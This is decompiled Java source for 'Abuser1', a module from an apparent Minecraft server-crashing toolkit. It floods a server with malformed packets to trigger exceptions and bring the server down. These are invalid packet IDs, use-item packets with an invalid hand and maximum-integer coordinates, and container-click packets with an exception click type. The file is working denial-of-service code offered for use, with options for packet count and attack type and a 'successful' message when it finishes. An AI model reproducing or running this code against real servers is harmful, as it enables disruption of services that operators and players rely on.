//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package us.whitedev.crashers.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import java.util.List;
import net.minecraft.core.BlockPos;
import net.minecraft.core.Direction;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.network.protocol.game.ServerboundUseItemOnPacket;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.phys.BlockHitResult;
import net.minecraft.world.phys.Vec3;
import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.ExceptionPacket;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class Abuser1 implements Crasher {
    private static final String METHOD_NAME = "Abuser1";
    private boolean enabled = false;

    public Abuser1() {
    }

    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        boolean invalidId = args[3].equals("true");
        boolean handException = args[4].equals("true");
        boolean clickException = args[5].equals("true");
        this.setEnabled(true);
        msgHelper.sendMessage("Starting crashing with &f" + this.getName(), true);

        for(int i = 0; i < packets; ++i) {
            if (invalidId) {
                PacketHelper.send(new ExceptionPacket());
            }

            if (handException) {
                PacketHelper.send(new ServerboundUseItemOnPacket(InteractionHand.EXCEPTION, new BlockHitResult(Vec3.ZERO, Direction.DOWN, new BlockPos(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE), true), Integer.MAX_VALUE));
            }

            if (clickException) {
                PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 1, 1, ClickType.EXCEPTION, ItemStack.EMPTY, new Int2ObjectArrayMap()));
            }
        }

        this.setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    public String getName() {
        return "Abuser1";
    }

    public boolean getEnabled() {
        return this.enabled;
    }

    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    public String getArgsUsage() {
        return "packets[100], invalidId[true], handException[false], clickException[false]";
    }

    public List<OptionUtil> getOptions() {
        return List.of(new OptionUtil("Packets", OptionType.INTEGER), new OptionUtil("InvalidID", OptionType.BOOLEAN), new OptionUtil("HandException", OptionType.BOOLEAN), new OptionUtil("ClickException", OptionType.BOOLEAN));
    }

    public String getDescription() {
        return "Exception Crasher [packetevent abuser]";
    }
}
